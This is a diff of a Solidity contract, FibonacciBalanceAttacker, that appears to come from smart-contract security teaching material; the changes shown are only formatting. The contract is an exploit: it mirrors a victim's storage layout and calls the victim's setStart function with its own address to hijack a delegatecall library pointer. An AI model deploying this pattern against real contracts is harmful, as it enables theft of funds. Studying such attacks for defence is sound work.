@@ -1,9 +1,8 @@
 pragma solidity ^0.4.22;
 
 contract FibonacciBalanceAttacker {
-    uint storageSlot0; // corresponds to fibonacciLibrary
-    uint storageSlot1; // corresponds to calculatedFibNumber
-    
+    uint256 storageSlot0; // corresponds to fibonacciLibrary
+    uint256 storageSlot1; // corresponds to calculatedFibNumber
 
     // fallback - this will run if a specified function is not found
     function() public {
@@ -15,7 +14,10 @@ contract FibonacciBalanceAttacker {
 
     function attack(address victim) public {
         // we call withdraw to send out ether
-        bool success = victim.call(bytes4(keccak256("setStart(uint256)")), uint256(address(this)));
+        bool success = victim.call(
+            bytes4(keccak256("setStart(uint256)")),
+            uint256(address(this))
+        );
         require(success);
     }
- }
+}
